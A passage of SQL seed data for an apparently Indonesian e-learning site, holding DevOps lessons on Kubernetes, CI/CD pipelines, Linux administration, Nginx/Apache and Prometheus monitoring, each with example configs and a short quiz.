Abstraksi network untuk mengakses Pod (yang IP-nya berubah). Tipe: ClusterIP (default, internal), NodePort, LoadBalancer, ExternalName.

```yaml
apiVersion: v1
kind: Service
metadata:
  name: api
spec:
  selector: {app: api}
  ports:
  - port: 80
    targetPort: 3000
  type: ClusterIP
```

### Ingress
HTTP/HTTPS routing dari eksternal ke Service.

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: api-ingress
  annotations:
    cert-manager.io/cluster-issuer: letsencrypt
spec:
  tls:
  - hosts: [api.example.com]
    secretName: api-tls
  rules:
  - host: api.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service: {name: api, port: {number: 80}}
```

### ConfigMap & Secret

```yaml
# ConfigMap untuk konfigurasi non-sensitif
apiVersion: v1
kind: ConfigMap
metadata: {name: api-config}
data:
  LOG_LEVEL: "info"
  config.yaml: |
    feature_flags:
      new_dashboard: true

---
# Secret untuk data sensitif (base64 encoded)
apiVersion: v1
kind: Secret
metadata: {name: db-secret}
type: Opaque
stringData:
  url: "postgresql://app:s3cret@db:5432/app"
```

## Perintah kubectl

```bash
# Apply manifest
kubectl apply -f deployment.yaml -f service.yaml
kubectl apply -f ./manifests/             # direktori

# Inspect
kubectl get pods -o wide
kubectl describe pod api-xxxx
kubectl logs -f api-xxxx
kubectl exec -it api-xxxx -- sh

# Scale & rollout
kubectl scale deployment api --replicas=5
kubectl rollout status deployment/api
kubectl rollout undo deployment/api
kubectl rollout history deployment/api

# Debug
kubectl get events --sort-by=''.lastTimestamp''
kubectl top pods
kubectl auth can-i create deployments
```

## Namespaces & RBAC

Namespaces membagi cluster menjadi lingkungan virtual (dev/staging/prod). RBAC mengatur siapa boleh apa.

```yaml
# ServiceAccount + Role + RoleBinding untuk aplikasi
apiVersion: v1
kind: ServiceAccount
metadata: {name: api-sa, namespace: prod}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: config-reader, namespace: prod}
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list"]
```

## StatefulSet & DaemonSet

- **StatefulSet** — Pod dengan identitas stabil (nama, network, storage). Cocok untuk database (MySQL, Cassandra, Kafka).
- **DaemonSet** — Pod berjalan di setiap node (node-exporter, log agent, CNI).

## Helm Package Manager

elm chart = kumpulan manifest template + values.yaml.

```bash
helm repo add bitnami https://charts.bitnami.com/bitnami
helm install my-release bitnami/postgresql \
  --set auth.postgresPassword=secret \
  --set primary.persistence.size=20Gi

helm upgrade my-release bitnami/postgresql -f values.yaml
helm rollback my-release 1
```

## Operator & Custom Resource

Operator adalah pola untuk mengelola aplikasi stateful kompleks (database failover, backup) dengan Custom Controller + Custom Resource Definition (CRD). Contoh: Prometheus Operator, Cert-Manager, ArgoCD.

## Tips & Best Practices

- Set **resource requests & limits** untuk semua container (mencegah noisy neighbor).
- Gunakan **liveness & readiness probe** agar K8s tahu kapan restart / mulai menerima traffic.
- **PodDisruptionBudget** untuk memastikan minimal replika saat maintenance.
- Pakai **namespaces** untuk isolasi environment/team.
- **GitOps** dengan ArgoCD/Flux—deklarasi state cluster via Git.
- **Policy as Code** dengan Kyverno/OPA Gatekeeper.
- Scan image di CI/CD sebelum deploy.

## Kesimpulan

Kubernetes adalah tools powerful dengan learning curve curam. Investasi mempelajari Pod, Deployment, Service, Ingress, dan Helm terbayar saat aplikasi mencapai skala di mana manual management tidak feasible. Dengan disiplin resource limits, probe, dan GitOps, K8s memberi platform yang dapat diandalkan untuk microservice modern. Mulai dari managed K8s (EKS/GKE/AKS) untuk fokus pada aplikasi, bukan operasional cluster.



## Studi Kasus: Deploy ke Production

Docker, Kubernetes, CI/CD.

## Tips

> Kuasai Linux sebelum Docker/K8s.', '☸️', false, '[{"question":"Unit terkecil yang dapat di-deploy di Kubernetes?","options":["Container","Pod","Node","Deployment"],"answer":1,"explanation":"Pod adalah unit terkecil; dapat berisi satu atau lebih container yang share network."},{"question":"Tipe Service yang mengekspos Pod ke eksternal via HTTP routing?","options":["ClusterIP","NodePort","Ingress","Headless"],"answer":2,"explanation":"Ingress mengatur HTTP/HTTPS routing dari eksternal ke Service."},{"question":"Tools package manager Kubernetes yang populer?","options":["kubectl","Helm","Docker Compose","kubeadm"],"answer":1,"explanation":"Helm adalah package manager untuk chart (template manifest Kubernetes)."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('ci-cd-pipeline', 7, 5, 'CI/CD Pipeline', 'ci-cd-pipeline', 'Continuous integration & deployment, pipeline otomatis, dan tools.', '# CI/CD Pipeline


![CI/CD Pipeline](https://sfile.chatglm.cn/images-ppt/015de1c2cc89.webp)

**CI/CD** (Continuous Integration / Continuous Delivery / Continuous Deployment) adalah praktik mengotomatiskan build, test, dan deployment aplikasi. CI memastikan setiap commit terintegrasi dan teruji; CD mengantarkan perubahan yang lulus uji ke produksi dengan aman dan cepat. CI/CD adalah pilar DevOps yang memungkinkan tim merilis fitur puluhan kali sehari dengan risiko rendah.

![CI/CD Pipeline](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Tahapan Pipeline

### 1. Source (Commit)
Trigger saat developer push ke repository (Git). Semua pipeline bermula dari event ini.

### 2. Build
Kompilasi kode, install dependency, build artifact (Docker image, jar, binary, npm package).

### 3. Test
- **Unit test** — cepat, isolasi, mock dependency.
- **Integration test** — dengan database/service asli (atau test container).
- **Static analysis** — linting (ESLint, pylint, golangci-lint).
- **Security scan** — SAST (Semgrep, CodeQL), SCA (Snyk, Dependabot), secret scan (gitleaks).
- **E2E test** — alur pengguna penuh (Cypress, Playwright).

### 4. Package
Build & push Docker image ke registry dengan tag unik (git SHA + semantic version).

### 5. Deploy to Staging
Auto-deploy ke environment staging untuk pengujian lebih lanjut.

### 6. Acceptance/Smoke Test
Validasi post-deployment di staging—API contract, smoke test kritis.

### 7. Deploy to Production
- **Continuous Delivery**: manual approval sebelum prod.
- **Continuous Deployment**: otomatis bila semua stage lulus.
- Strategi: blue-green, canary, rolling.

### 8. Post-Deploy Monitoring
Observability: error rate, latency, business metrics. Rollback otomatis bila SLO dilanggar.

## Contoh Pipeline GitHub Actions

```yaml
# .github/workflows/ci.yml
name: CI/CD
on:
  push: {branches: [main]}
  pull_request: {branches: [main]}

permissions:
  contents: read
  id-token: write   # untuk OIDC ke AWS

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-node@v4
      with:
        node-version: ''20''
        cache: ''npm''
    - run: npm ci
    - run: npm run lint
    - run: npm test -- --coverage
    - uses: codecov/codecov-action@v4
    - name: SAST
      uses: github/codeql-action/init@v3
    - uses: github/codeql-action/analyze@v3

  build-push:
    needs: test
    if: github.ref == ''refs/heads/main''
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - uses: docker/setup-buildx-action@v3
    - uses: docker/login-action@v3
      with: {registry: ghcr.io, username: ${{github.actor}}, password: ${{secrets.GITHUB_TOKEN}}}
    - uses: docker/build-push-action@v5
      with:
        push: true
        tags: |
          ghcr.io/${{github.repository}}:${{github.sha}}
          ghcr.io/${{github.repository}}:latest
        cache-from: type=gha
        cache-to: type=gha,mode=max

  deploy:
    needs: build-push
    runs-on: ubuntu-latest
    environment: production
    steps:
    - uses: actions/checkout@v4
    - name: Configure AWS credentials
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
        aws-region: ap-southeast-1
    - name: Deploy to EKS
      run: |
        aws eks update-kubeconfig --name prod-cluster
        sed -i "s|IMAGE_TAG|${{ github.sha }}|" k8s/deployment.yaml
        kubectl apply -f k8s/
        kubectl rollout status deployment/api -n prod
```

## GitOps dengan ArgoCD

GitOps menyatakan desired state cluster di Git, dan operator (ArgoCD/Flux) menyinkronkan. Keuntungan: audit trail, mudah rollback (git revert), drift detection.

```yaml
# ArgoCD Application
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata: {name: api, namespace: argocd}
spec:
  project: default
  source:
    repoURL: https://github.com/org/k8s-manifests
    targetRevision: main
    path: prod/api
  destination:
    server: https://kubernetes.default.svc
    namespace: prod
  syncPolicy:
    automated: {prune: true, selfHeal: true}
    syncOptions: [CreateNamespace=true]
```

## Strategi Deployment

### Blue-Green
Dua environment identik. Switch traffic seketika. Rollback = switch balik.

### Canary
Rilis ke persentase kecil pengguna (1% → 10% → 50% → 100%), pause untuk observasi.

### Rolling
Update Pod bertahap (maxUnavailable + maxSurge). Default K8s Deployment.

### Feature Flags
Decouple deploy dari release—fitur bisa diaktifkan per-user setelah deploy (LaunchDarkly, Unleash).

## Tools CI/CD Populer

| Tool | Karakteristik |
|------|--------------|
| **GitHub Actions** | Native GitHub, marketplace besar, YAML |
| **GitLab CI** | All-in-one GitLab, runner self-hosted |
| **Jenkins** | Veteran, plugin raksasa, script Groovy |
| **CircleCI** | Cloud-native, orb reusable |
| **ArgoCD / Flux** | GitOps untuk K8s |
| **Tekton** | Kubernetes-native CI/CD |
| **AWS CodePipeline** | Integrasi mendalam dengan layanan AWS |

## Keamanan dalam Pipeline (DevSecOps)

- **SAST** di setiap PR (CodeQL, Semgrep, SonarQube).
- **SCA** untuk dependency (Dependabot, Snyk, Trivy).
- **Secret scan** (gitleaks, TruffleHog) untuk mencegah leak credential.
- **Container scan** sebelum push (Trivy, Grype).
- **DAST** di staging (OWASP ZAP, Nuclei).
- **Signed artifact** (Cosign, Sigstore) untuk supply chain security.
- **OIDC federation** — hapus long-lived credential, pakai short-lived token.

## Tips & Best Practices

- Pipeline harus **cepat** (< 10 menit idealnya). Paralelkan jobs.
- Cache dependency (npm, pip, Docker layer) untuk mempercepat.
- Fail fast: jalankan test paling cepat & paling mungkin gagal lebih dulu.
- Setiap stage menghasilkan **artifact** yang dapat ditelusuri (git SHA, build ID).
- Sembunyikan secret via secret manager pipeline, jangan hardcode.
- Pipeline idempoten—bisa dijalankan ulang dengan hasil sama.
- Pisahkan deployment dari release (feature flags).

## Kesimpulan

CI/CD adalah tulang punggung rekayasa perangkat lunak modern. Dengan pipeline otomatis, test menyeluruh, dan deployment strategis, tim dapat merilis dengan kepercayaan diri tinggi dan risiko rendah. Kuncinya: **automasi segalanya, observasi setiap langkah, dan rollback mudah**. Investasi pada pipeline matang terbayar dalam kualitas, kecepatan, dan ketenangan pikiran.



## Studi Kasus: Deploy ke Production

Docker, Kubernetes, CI/CD.

## Tips

> Kuasai Linux sebelum Docker/K8s.', '🔄', false, '[{"question":"Apa perbedaan Continuous Delivery vs Continuous Deployment?","options":["Tidak ada beda","Delivery butuh approval manual, Deployment otomatis","Deployment untuk staging","Delivery hanya build"],"answer":1,"explanation":"Continuous Delivery butuh approval manual ke prod; Continuous Deployment otomatis jika lulus uji."},{"question":"Strategi deploy yang merilis ke persentase kecil pengguna dulu?","options":["Blue-green","Canary","Rolling","Recreate"],"answer":1,"explanation":"Canary deploy bertahap (1% → 10% → 100%) untuk meminimalkan risiko."},{"question":"Pendekatan yang menyatakan desired state K8s via Git?","options":["DevOps","GitOps","NoOps","SecOps"],"answer":1,"explanation":"GitOps menggunakan Git sebagai single source of truth untuk state cluster."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('linux-server-administration', 7, 6, 'Linux Server Administration', 'linux-server-administration', 'Manajemen user, permission, service systemd, dan hardening server.', '# Linux Server Administration


![Linux Server Administration](https://sfile.chatglm.cn/images-ppt/ba6179ea0cf0.jpg)

Linux mendominasi server—dari VPS kecil hingga data center berskala hyperscale. Menjadi administrator Linux yang kompeten membutuhkan pemahaman user management, permission, service systemd, networking, storage, dan hardening keamanan. Materi ini mengupas keterampilan inti yang wajib dikuasai setiap DevOps/SRE.

![Linux Server Administration](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## User & Group Management

Setiap proses berjalan sebagai user. User root (UID 0) punya hak mutlak—jarang dipakai langsung.

```bash
# Tambah user dengan home & shell
sudo useradd -m -s /bin/bash budi
sudo passwd budi

# Tambah ke group (mis. sudo/docker)
sudo usermod -aG sudo,docker budi

# Lock/unlock akun
sudo usermod -L budi      # lock
sudo usermod -U budi      # unlock

# Hapus user + home
sudo userdel -r budi

# Lihat info user
id budi
groups budi
getent passwd budi
```

## File Permission & Ownership

Setiap file punya permission untuk owner, group, others: read (r=4), write (w=2), execute (x=1).

```bash
# Lihat permission
ls -l /etc/passwd
# -rw-r--r-- 1 root root 3056 Jan 1 10:00 /etc/passwd

# Ubah permission simbolik
chmod u+x script.sh          # +x untuk owner
chmod g-w file.txt           # -w untuk group
chmod 750 script.sh          # rwxr-x---

# Ubah owner
sudo chown budi:dev file.txt
sudo chown -R budi:dev /srv/app/    # recursive

# ACL (granular)
sudo setfacl -m u:ci:rx /srv/app/
getfacl /srv/app/

# Special permission
chmod u+s /usr/bin/passwd    # setuid
chmod g+s /shared/            # setgid (new file inherit group)
chmod +t /tmp                 # sticky bit
```

## systemd Service Management

systemd adalah init system modern di hampir semua distro mainstream.

```bash
# Service control
sudo systemctl start nginx
sudo systemctl stop nginx
sudo systemctl restart nginx
sudo systemctl reload nginx   # tanpa downtime
sudo systemctl enable nginx   # start saat boot
sudo systemctl disable nginx
sudo systemctl status nginx

# Log dengan journalctl
journalctl -u nginx -f         # follow
journalctl -u nginx --since "1 hour ago"
journalctl -p err -b           # error sejak boot
journalctl --vacuum-time=7d    # rotasi

# List units
systemctl list-units --type=service --state=running
```

### Custom systemd unit

```ini
# /etc/systemd/system/api.service
[Unit]
Description=My API Service
After=network.target postgresql.service

[Service]
Type=simple
User=api
Group=api
WorkingDirectory=/srv/api
EnvironmentFile=/etc/api/api.env
ExecStart=/usr/bin/node /srv/api/dist/main.js
Restart=on-failure
RestartSec=5s

# Hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/log/api
CapabilityBoundingSet=
AmbientCapabilities=
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now api
```

## Package Management

```bash
# Debian/Ubuntu
sudo apt update && sudo apt upgrade -y
sudo apt install nginx
sudo apt remove nginx
apt list --installed
apt-cache search keyword
dpkg -L nginx              # file dari package

# RHEL/CentOS/Fedora
sudo dnf install nginx
sudo dnf update
dnf history

# Paket universal: snap, flatpak
sudo snap install code --classic
```

## Networking

```bash
# IP & interface
ip addr show
ip link set eth0 up/down

# Routing
ip route
sudo ip route add 10.0.0.0/24 via 192.168.1.1

# Koneksi aktif
ss -tunap | grep ESTABLISHED

# DNS
cat /etc/resolv.conf
dig example.com +short
host example.com

# Firewall (ufw di Ubuntu)
sudo ufw default deny incoming
sudo ufw allow 22/tcp
sudo ufw allow 80,443/tcp
sudo ufw enable
sudo ufw status verbose

# Firewall (firewalld di RHEL)
sudo firewall-cmd --permanent --add-service=https
sudo firewall-cmd --reload
```

## Storage & Filesystem

```bash
# Disk & partition
lsblk
sudo fdisk -l
sudo parted /dev/sdb print

# Format & mount
sudo mkfs.ext4 /dev/sdb1
sudo mkdir /data
sudo mount /dev/sdb1 /data

# fstab (persistent)
echo "/dev/sdb1 /data ext4 defaults,noatime 0 2" | sudo tee -a /etc/fstab
sudo mount -a   # test fstab

# LVM (Logical Volume Manager)
sudo pvcreate /dev/sdb
sudo vgcreate vg_data /dev/sdb
sudo lvcreate -L 50G -n lv_data vg_data

# Disk usage
df -hT
du -sh /var/log/*
ncdu /                  # interactive
```

## Process & Resource Management

```bash
# Top process
top -o %CPU
htop
ps aux --sort=-%mem | head

# Cari & kill process
pgrep -f "node.*api"
pkill -f "node.*api"
kill -9 12345

# Limit resource (cgroups via systemd atau ulimit)
ulimit -n      # file descriptor
ulimit -u      # max user processes

# Nice & renice (CPU priority)
nice -n 10 backup.sh
renice -5 -p 12345
```

## Hardening Keamanan

1. **Update rutin** — `unattended-upgrades` untuk security patch otomatis.
2. **SSH hardening** — disable root login, password auth; pakai key-only + MFA.
3. **Fail2ban** — ban IP yang brute-force.
4. **Auditd** — syscall audit untuk compliance.
5. **AppArmor/SELinux** — mandatory access control.
6. **Lynis** — audit keamanan otomatis.

```bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers budi deploy
Port 22
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 0

sudo systemctl reload sshd
```

```bash
# Audit keamanan dengan Lynis
sudo apt install lynis
sudo lynis audit system --quick
```

## Tips & Best Practices

- Gunakan **configuration management** (Ansible, Chef, Puppet) untuk konsistensi.
- Aktifkan **NTP/chrony** agar waktu sinkron (krusial untuk log & TLS).
- Setup **logrotate** agar log tidak memenuhi disk.
- **Sudo** dengan `sudo -l` untuk audit hak; hindari `sudo su -`.
- Monitor dengan **Prometheus node_exporter** + alerting.
- Backup konfigurasi penting ke Git atau S3.

## Kesimpulan

Linux server administration adalah keterampilan fondasi yang membuka pintu untuk DevOps, SRE, dan cloud engineering. Dengan menguasai user, permission, systemd, networking, dan hardening, Anda dapat menjalankan server yang andal, aman, dan efisien. Disiplin konfigurasi reproducible (IaC) dan monitoring proaktif membedakan admin biasa dari engineer kelas produksi.



## Studi Kasus: Deploy ke Production

Docker, Kubernetes, CI/CD.

## Tips

> Kuasai Linux sebelum Docker/K8s.', '🐧', false, '[{"question":"Permission numerik 750 berarti?","options":["rwxrwxrwx","rwxr-x---","rwxr--r--","rw-r-----"],"answer":1,"explanation":"750 = rwx (7) untuk owner, r-x (5) untuk group, --- (0) untuk others."},{"question":"Perintah untuk melihat dan follow log service systemd?","options":["tail -f /var/log/syslog","journalctl -u nginx -f","dmesg","cat /var/log/nginx.log"],"answer":1,"explanation":"journalctl -u <service> -f mengikuti log service secara real-time."},{"question":"Praktik SSH hardening yang paling direkomendasikan?","options":["Enable root login dengan password","Key-only + disable root login","Port 22 default tanpa firewall","Password pendek mudah diingat"],"answer":1,"explanation":"Key-only authentication + disable root login mengurangi risiko brute force."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('web-server-nginx-apache', 7, 7, 'Web Server Nginx Apache', 'web-server-nginx-apache', 'Konfigurasi Nginx dan Apache, virtual host, TLS, dan reverse proxy.', '# Web Server Nginx & Apache


![Web Server Nginx Apache](https://sfile.chatglm.cn/images-ppt/b29d8053f167.jpg)

Web server adalah tulang punggung internet—menerima HTTP request, mengembalikan response, dan mengelola koneksi klien. Dua web server paling populer di Linux adalah **Apache HTTP Server** (veteran sejak 1995) dan **Nginx** (sejak 2004, fokus pada event-driven). Memahami keduanya, konfigurasinya, dan kapan memilih salah satu adalah keterampilan inti web administrator.

![Web Server Nginx Apache](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Nginx vs Apache

| Aspek | Apache | Nginx |
|-------|--------|-------|
| Arsitektur | Process/Thread per koneksi | Event-driven async |
| Static file | Cepat | Sangat cepat |
| Dynamic | .htaccess, mod_php | Reverse proxy ke backend |
| Konfigurasi | .htaccess per dir (overhead) | Centralized |
| Memory | Tinggi per koneksi | Konsisten rendah |
| Best fit | Shared hosting, dynamic content | Reverse proxy, high traffic |

Banyak setup modern mengombinasi: **Nginx sebagai front (static + reverse proxy)** → **Apache/Node/Python di belakang**.

## Instalasi

```bash
# Ubuntu/Debian
sudo apt update && sudo apt install -y nginx
sudo systemctl enable --now nginx

# Apache
sudo apt install -y apache2

# Verifikasi
curl -I http://localhost/
nginx -t         # test config
apache2ctl configtest
```

## Nginx: Konfigurasi Dasar

File utama: `/etc/nginx/nginx.conf`. Site config: `/etc/nginx/sites-available/` (symlink ke `sites-enabled/`).

```nginx
# /etc/nginx/sites-available/example.com
server {
    listen 80;
    listen [::]:80;
    server_name example.com www.example.com;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name example.com www.example.com;

    ssl_certificate     /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;

    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src ''self''" always;

    root /var/www/example.com;
    index index.html index.htm;

    location / {
        try_files $uri $uri/ =404;
    }

    location /api/ {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 60s;
    }

    # Cache static asset
    location ~* \.(js|css|png|jpg|jpeg|gif|svg|woff2?)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
        access_log off;
    }

    # Gzip
    gzip on;
    gzip_vary on;
    gzip_min_length 1024;
    gzip_types text/plain text/css application/json application/javascript text/xml;

    client_max_body_size 20m;

    access_log /var/log/nginx/example.access.log;
    error_log  /var/log/nginx/example.error.log warn;
}
```

```bash
# Aktifkan site
sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx

# Dapatkan sertifikat TLS gratis
sudo certbot --nginx -d example.com -d www.example.com
```

## Apache: Virtual Host

```apache
# /etc/apache2/sites-available/example.com.conf
<VirtualHost *:80>
    ServerName example.com
    ServerAlias www.example.com
    Redirect permanent / https://example.com/
</VirtualHost>

<VirtualHost *:443>
    ServerName example.com
    DocumentRoot /var/www/example.com

    SSLEngine on
    SSLCertificateFile      /etc/letsencrypt/live/example.com/fullchain.pem
    SSLCertificateKeyFile   /etc/letsencrypt/live/example.com/privkey.pem

    <Directory /var/www/example.com>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog  ${APACHE_LOG_DIR}/example.error.log
    CustomLog ${APACHE_LOG_DIR}/example.access.log combined

    # Reverse proxy ke backend Node
    ProxyPreserveHost On
    ProxyPass        /api/ http://127.0.0.1:3000/
    ProxyPassReverse /api/ http://127.0.0.1:3000/
</VirtualHost>
```

```bash
sudo a2enmod ssl proxy proxy_http rewrite headers
sudo a2ensite example.com
sudo apache2ctl configtest && sudo systemctl reload apache2
```

## Reverse Proxy & Load Balancing

Nginx sangat populer sebagai reverse proxy + load balancer:

```nginx
upstream api_backend {
    least_conn;
    server 10.0.0.10:3000 max_fails=3 fail_timeout=30s;
    server 10.0.0.11:3000 max_fails=3 fail_timeout=30s;
    server 10.0.0.12:3000 backup;
    keepalive 32;
}

server {
    listen 443 ssl http2;
    # ... SSL config ...

    location / {
        proxy_pass http://api_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_next_upstream error timeout http_502 http_503;
    }
}
```

## Performance Tuning

```nginx
# /etc/nginx/nginx.conf (worker section)
worker_processes auto;
worker_rlimit_nofile 65535;

events {
    worker_connections 8192;
    multi_accept on;
    use epoll;
}

http {
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    keepalive_requests 1000;
    reset_timedout_connection on;

    # Open file cache
    open_file_cache max=10000 inactive=20s;
    open_file_cache_valid 30s;
    open_file_cache_min_uses 2;
    open_file_cache_errors on;

    # Buffer
    client_body_buffer_size 16k;
    client_header_buffer_size 1k;
    large_client_header_buffers 4 8k;
}
```

Tuning kernel Linux pendukung:

```bash
# /etc/sysctl.d/99-webserver.conf
net.core.somaxconn = 4096
net.ipv4.tcp_max_syn_backlog = 8192
net.ipv4.tcp_tw_reuse = 1
net.ipv4.ip_local_port_range = 1024 65535
net.core.netdev_max_backlog = 16384
fs.file-max = 2097152

sudo sysctl --system
```

## Keamanan & Hardening

- Hapus server tokens: `server_tokens off;` di nginx, `ServerTokens Prod` di Apache.
- Pakai TLS 1.2/1.3 saja, hapus TLS 1.0/1.1.
- Aktifkan OCSP stapling.
- Set HSTS dengan preload.
- Rate limiting di Nginx: `limit_req_zone`.
- WAF: ModSecurity + OWASP CRS, atau Cloudflare di depan.

```nginx
# Rate limiting
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;

server {
    location /api/ {
        limit_req zone=api burst=20 nodelay;
        proxy_pass http://api_backend;
    }
}
```

## Debugging

```bash
# Test config
nginx -t
apache2ctl configtest

# Lihat active connections
ss -tnp | grep nginx

# Real-time access log
tail -f /var/log/nginx/access.log

# Analyze log dengan goaccess
goaccess /var/log/nginx/access.log --log-format=COMBINED -o report.html

# Cek TLS
openssl s_client -connect example.com:443 -servername example.com < /dev/null 2>/dev/null | openssl x509 -noout -dates -issuer

# Test SSL grade
curl https://www.ssllabs.com/ssltest/analyze.html?d=example.com
```

## Tips & Best Practices

- Pisahkan config per site di `sites-available` (mudah manage).
- Reload (bukan restart) bila memungkinkan—no downtime.
- Logrotate otomatis untuk log akses/error.
- Gunakan `include` untuk snippet yang reusable (proxy, ssl, security headers).
- Monitoring dengan Prometheus nginx_exporter + Grafana.
- Automasi via Ansible untuk konsistensi multi-server.

## Kesimpulan

Nginx dan Apache adalah dua pilar web server di Linux. Pilihan tergantung use case: Nginx unggul sebagai reverse proxy dan serving static file, Apache fleksibel untuk hosting dinamis dengan .htaccess. Menguasai virtual host, TLS, reverse proxy, dan performance tuning membuat Anda mampu menjalankan aplikasi web produksi yang andal dan cepat. Keamanan (TLS modern, headers, rate limiting) adalah kewajiban, bukan opsional.



## Studi Kasus: Deploy ke Production

Docker, Kubernetes, CI/CD.

## Tips

> Kuasai Linux sebelum Docker/K8s.', '🌐', false, '[{"question":"Web server yang menggunakan arsitektur event-driven async?","options":["Apache","Nginx","IIS","Tomcat"],"answer":1,"explanation":"Nginx event-driven async, lebih efisien memori pada koneksi banyak."},{"question":"Direktif Nginx untuk mengarahkan /api ke backend Node di port 3000?","options":["rewrite /api http://localhost:3000","proxy_pass http://127.0.0.1:3000","redirect /api 3000","alias /api 3000"],"answer":1,"explanation":"proxy_pass meneruskan request ke upstream backend."},{"question":"Tools untuk mendapatkan sertifikat TLS gratis otomatis?","options":["OpenSSL CLI","Let''s Encrypt via Certbot","CA berbayar wajib","Self-signed untuk prod"],"answer":1,"explanation":"Certbot + Let''s Encrypt memberi sertifikat TLS gratis via ACME protocol."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('monitoring-logging', 7, 8, 'Monitoring & Logging', 'monitoring-logging', 'Prometheus, Grafana, ELK, dan observability sistem modern.', '# Monitoring & Logging


![Monitoring & Logging](https://sfile.chatglm.cn/images-ppt/4708a4e56bc6.png)

**Observability** adalah kemampuan memahami keadaan sistem dari output eksternal (metric, log, trace). Tanpa observability, operasional adalah menebak dalam gelap. Tiga pilar observability—metrics, logs, traces—saling melengkapi. Materi ini mengupas stack modern: Prometheus + Grafana untuk metrik, ELK/Loki untuk log, dan Jaeger/Tempo untuk tracing.

![Monitoring & Logging](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Tiga Pilar Observability

| Pilar | Apa | Tools |
|-------|-----|-------|
| **Metrics** | Angka numerik time-series (CPU, req/s) | Prometheus, Datadog, InfluxDB |
| **Logs** | Event diskrit dengan timestamp | ELK, Loki, Splunk |
| **Traces** | Request lintas service (span) | Jaeger, Tempo, OpenTelemetry |

## Prometheus + Grafana

Prometheus adalah time-series database dengan model pull (scrape target). Grafana memvisualisasikan data Prometheus.

### Metrik Prometheus (4 tipe)
- **Counter** — monoton naik (total request).
- **Gauge** — naik turun (memory used).
- **Histogram** — distribusi (latency bucket).
- **Summary** — quantile (p99 latency).

### Instrumentasi aplikasi

```python
# Python dengan prometheus_client
from prometheus_client import Counter, Histogram, start_http_server
import time, random

REQUESTS = Counter(''http_requests_total'', ''Total HTTP requests'', [''method'', ''endpoint''])
LATENCY = Histogram(''http_request_duration_seconds'', ''HTTP latency'', [''endpoint''])

def handle_request(method, endpoint):
    REQUESTS.labels(method=method, endpoint=endpoint).inc()
    with LATENCY.labels(endpoint=endpoint).time():
        time.sleep(random.uniform(0.01, 0.1))
        return "OK"

start_http_server(8000)  # /metrics endpoint
```

### Konfigurasi Prometheus

```yaml
# prometheus.yml
global:
  scrape_interval: 15s
  evaluation_interval: 15s

rule_files: ["/etc/prometheus/rules/*.yml"]

scrape_configs:
  - job_name: ''node''
    static_configs:
      - targets: [''node1:9100'', ''node2:9100'']
  - job_name: ''api''
    metrics_path: /metrics
    static_configs:
      - targets: [''api:8000'']
  - job_name: ''k8s-pods''
    kubernetes_sd_configs:
      - role: pod
    relabel_configs:
      - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
        action: keep
        regex: true
```

### Alerting rules

```yaml
# rules/api.yml
groups:
- name: api
  rules:
  - alert: HighErrorRate
    expr: |
      sum(rate(http_requests_total{status=~"5.."}[5m]))
      / sum(rate(http_requests_total[5m])) > 0.05
    for: 10m
    labels: {severity: critical}
    annotations:
      summary: "Error rate > 5% on API"
